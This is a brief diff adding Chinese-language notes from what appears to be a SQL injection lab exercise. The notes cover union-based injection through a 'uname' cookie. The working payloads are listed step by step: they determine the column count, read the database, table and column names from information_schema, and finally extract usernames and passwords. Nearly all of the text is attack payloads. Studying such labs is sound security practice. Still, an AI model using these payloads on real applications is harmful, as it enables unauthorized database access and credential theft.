@@ -1,0 +1,21 @@
+Cookie: uname=admin\
+报错，根据报错可推测sql：
+select 字段名 from 表 where uname = '$uname' limit 0,1
+
+1.字段数
+Cookie: uname=admin' order by 3--+
+正常显示，说明字段数至少为3
+Cookie: uname=admin' order by 4--+
+报错，说明字段数为3
+2.数据库名
+Cookie: uname=0'--+
+显示没有该用户名（它又骂我
+Cookie: uname=0' union select 1,(select database()),3--+
+显示表名为security
+3.表名
+Cookie: uname=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3--+
+4.字段名
+Cookie: uname=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),3--+
+5.字段值
+Cookie: uname=0' union select 1,(select group_concat(username,0x3a,password) from users),3--+
+
